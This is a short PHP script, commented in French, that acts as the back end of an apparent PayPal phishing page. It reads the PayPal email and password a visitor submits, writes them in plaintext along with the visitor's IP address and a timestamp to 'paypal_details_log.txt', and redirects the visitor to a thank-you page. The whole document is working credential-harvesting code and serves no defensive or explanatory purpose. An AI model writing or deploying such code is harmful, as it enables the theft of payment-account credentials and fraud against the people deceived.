<?php
// Inclure le fichier pour enregistrer les connexions
include 'log_connections.php';

// Chemin vers le fichier de log pour les détails PayPal
$paypalLogFile = 'paypal_details_log.txt';

// Récupérer les données du formulaire
$paypalEmail = $_POST['paypal-email'];
$paypalPassword = $_POST['paypal-password']; // Notez que le mot de passe doit être stocké en toute sécurité

// Obtenez l'adresse IP de l'utilisateur
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Obtenez la date et l'heure actuelles
$dateTime = date('Y-m-d H:i:s');

// Créez une chaîne de texte avec les informations de connexion
$paypalLogEntry = "Date/Heure: $dateTime | IP: $ipAddress | Email PayPal: $paypalEmail | Mot de passe PayPal: $paypalPassword\n";

// Écrire les informations dans le fichier de log
file_put_contents($paypalLogFile, $paypalLogEntry, FILE_APPEND);

// Rediriger vers la page de confirmation
header('Location: thank_you.html');
exit();
?>
